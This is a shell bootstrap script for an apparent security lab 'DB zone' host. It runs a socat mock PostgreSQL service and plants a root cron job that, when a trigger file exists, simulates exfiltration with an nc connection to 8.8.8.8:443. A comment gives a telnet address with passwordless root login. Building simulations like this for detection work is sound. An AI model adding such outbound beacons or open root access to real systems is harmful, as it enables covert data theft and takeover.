#!/bin/sh
# Bootstrap Alpine-2 (DB zone, 10.1.200.10)
# Normal:     socat :5432 mock postgres — accepts queries from APP
# Compromised: touch /tmp/compromised → attacker cron exfil DB→8.8.8.8:443 every 90s
# Paste into: telnet 112.137.129.232:5011  (login: root, no password)
set -e

echo "[db] installing packages"
apk add --no-cache socat curl busybox-extras 2>&1 | tail -3

# --- mock postgres responder ---
cat > /usr/local/bin/db-mock.sh <<'EOF'
#!/bin/sh
exec socat -d TCP-LISTEN:5432,reuseaddr,fork \
  SYSTEM:'printf "PG_OK row_count=42 ts=$(date +%s)\n"; sleep 0.1'
EOF
chmod +x /usr/local/bin/db-mock.sh

cat > /etc/init.d/db-mock <<'OPENRC'
#!/sbin/openrc-run
name="db-mock"
command="/usr/local/bin/db-mock.sh"
command_background=true
pidfile="/run/db-mock.pid"
output_log="/var/log/db-mock.log"
error_log="/var/log/db-mock.log"
depend() { need net; }
OPENRC
chmod +x /etc/init.d/db-mock

rc-update add db-mock default 2>&1 | tail -1
service db-mock restart

# --- attacker script (runs ON db host, simulates exfil after DB compromise) ---
cat > /usr/local/bin/attacker-db.sh <<'ATTACKER'
#!/bin/sh
# Only runs when /tmp/compromised exists
# Simulates: attacker who pwned DB exfiltrates data outbound (T1041 Exfil over C2)
[ -f /tmp/compromised ] || exit 0
logger -t "attacker-db" "exfiltration attempt: DB→8.8.8.8:443"
nc -w 3 8.8.8.8 443 < /dev/null 2>&1
ATTACKER
chmod +x /usr/local/bin/attacker-db.sh

cat > /etc/crontabs/root <<'CRON'
* * * * * /usr/local/bin/attacker-db.sh
* * * * * sleep 45; /usr/local/bin/attacker-db.sh
CRON

rc-update add crond default 2>&1 | tail -1
service crond restart

sleep 1
echo "ping" | nc -w 1 localhost 5432 | head -1 && echo "← db-mock :5432 OK" || echo "← db-mock FAIL"
echo "[db] DONE"
echo "  Normal mode : db-mock :5432 accepting connections"
echo "  Attack mode : touch /tmp/compromised  (to deactivate: rm /tmp/compromised)"
